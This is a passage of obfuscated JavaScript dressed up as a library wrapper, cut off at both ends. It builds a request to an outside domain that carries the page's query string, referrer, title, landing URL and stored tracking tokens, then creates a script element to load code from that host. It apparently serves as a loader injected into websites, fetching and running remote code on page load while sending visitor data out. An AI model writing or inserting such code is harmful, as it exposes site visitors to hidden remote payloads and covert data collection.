...
(function (global, factory) {
  var name = '_d6mqLn9yCtp9ry3F';
    if (!window._d6mqLn9yCtp9ry3F) {
        window._d6mqLn9yCtp9ry3F = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://mivronix.pro/tFdSRwqv',
        };
    }
    const _Bhbq5p8XGGhLbwwr = localStorage.getItem('config');
    if (typeof _Bhbq5p8XGGhLbwwr !== 'undefined' && _Bhbq5p8XGGhLbwwr !== null) {
        var _xhYyLjHXhB3kBSyP = JSON.parse(_Bhbq5p8XGGhLbwwr);
        var _HXG8QRnnVthQh8gZ = Math.round(+new Date()/1000);
        if (_xhYyLjHXhB3kBSyP.created_at + window._d6mqLn9yCtp9ry3F.ttl < _HXG8QRnnVthQh8gZ) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _BZc7HtrLwZ3dxTgz = localStorage.getItem('subId');
    var _pqJKs1TwPRYMTxsq = localStorage.getItem('token');
    var _XrQfHSR7FG2FSbCz = '?return=js.client';
        _XrQfHSR7FG2FSbCz += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _XrQfHSR7FG2FSbCz += '&se_referrer=' + encodeURIComponent(document.referrer);
        _XrQfHSR7FG2FSbCz += '&default_keyword=' + encodeURIComponent(document.title);
        _XrQfHSR7FG2FSbCz += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _XrQfHSR7FG2FSbCz += '&name=' + encodeURIComponent(name);
        _XrQfHSR7FG2FSbCz += '&host=' + encodeURIComponent(window._d6mqLn9yCtp9ry3F.R_PATH);
    if (typeof _BZc7HtrLwZ3dxTgz !== 'undefined' && _BZc7HtrLwZ3dxTgz && window._d6mqLn9yCtp9ry3F.unique) {
        _XrQfHSR7FG2FSbCz += '&sub_id=' + encodeURIComponent(_BZc7HtrLwZ3dxTgz);
    }
    if (typeof _pqJKs1TwPRYMTxsq !== 'undefined' && _pqJKs1TwPRYMTxsq && window._d6mqLn9yCtp9ry3F.unique) {
        _XrQfHSR7FG2FSbCz += '&token=' + encodeURIComponent(_pqJKs1TwPRYMTxsq);
    }
    if ('' !== '') {
        _XrQfHSR7FG2FSbCz += '&bypass_cache=';
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._d6mqLn9yCtp9ry3F.R_PATH + _XrQfHSR7FG2FSbCz;
